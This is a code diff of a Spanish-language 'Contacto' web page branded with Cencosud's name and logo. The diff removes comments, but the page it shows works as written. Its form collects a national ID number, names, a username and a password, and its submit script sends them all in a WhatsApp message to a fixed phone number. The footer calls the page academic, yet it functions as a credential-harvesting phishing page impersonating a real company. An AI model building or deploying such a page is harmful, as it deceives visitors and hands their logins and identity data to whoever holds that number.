@@ -4,19 +4,14 @@
 <head>
     <meta charset="UTF-8">
     <title>Contacto - Cencosud</title>
-    <!-- vinculamos la hoja de estilos general -->
     <link rel="stylesheet" href="css/style.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
 
 <body>
-
-    <!-- La barra estatica de arriba de todo -->
     <div id="barra-superior">
         <img src="imagenes/Cencosud_logo.png" alt="Logo Cencosud" id="logo-en-barra">
     </div>
-
-    <!-- Menu de navegacion de la izquierda -->
     <div id="menu-lateral">
         <a href="index.html" class="boton-menu" title="Inicio">
             <svg viewBox="0 0 24 24">
@@ -36,8 +31,6 @@
             </svg>
         </a>
     </div>
-
-    <!-- Contenedor general -->
     <div id="contenedor-principal">
 
         <div id="seccion-contacto">
@@ -74,13 +67,9 @@
                     <label for="password">Contraseña</label>
                     <input type="password" id="password" name="password" placeholder="Su contraseña" required>
                 </div>
-
-                <!-- Boton para mandar -->
                 <button type="submit" id="boton-enviar">Enviar por WhatsApp</button>
             </form>
         </div>
-
-        <!-- El pie de pagina que va abajo -->
         <div id="pie-de-pagina">
             <div class="texto-footer">
                 <p>Página web realizada para fines netamente académicos por: Jonatan Puerto &copy; 2026</p>
@@ -110,9 +99,8 @@
 
     <script>
         document.getElementById('formulario-estudiante').addEventListener('submit', function (e) {
-            e.preventDefault(); // Evitamos que rercargue la pagina
+            e.preventDefault();
 
-            // Sacamos todos los valores del formulario
             var cedula = document.getElementById('cedula').value;
             var nombres = document.getElementById('nombres').value;
             var apellidos = document.getElementById('apellidos').value;
@@ -120,7 +108,6 @@
             var usuario = document.getElementById('usuario').value;
             var password = document.getElementById('password').value;
 
-            // Armamos el texto para whatsapp
             var texto = "Hola, aquí envío mis datos de contacto:%0A" +
                 "- Cédula: " + cedula + "%0A" +
                 "- Nombres: " + nombres + "%0A" +
@@ -129,10 +116,8 @@
                 "- Usuario: " + usuario + "%0A" +
                 "- Contraseña: " + password;
 
-            // Api de whatsapp al numero pedido
             var urlWhatsapp = "https://api.whatsapp.com/send?phone=573222802393&text=" + texto;
 
-            // abrimos la url
             window.open(urlWhatsapp, '_blank');
         });
     </script>
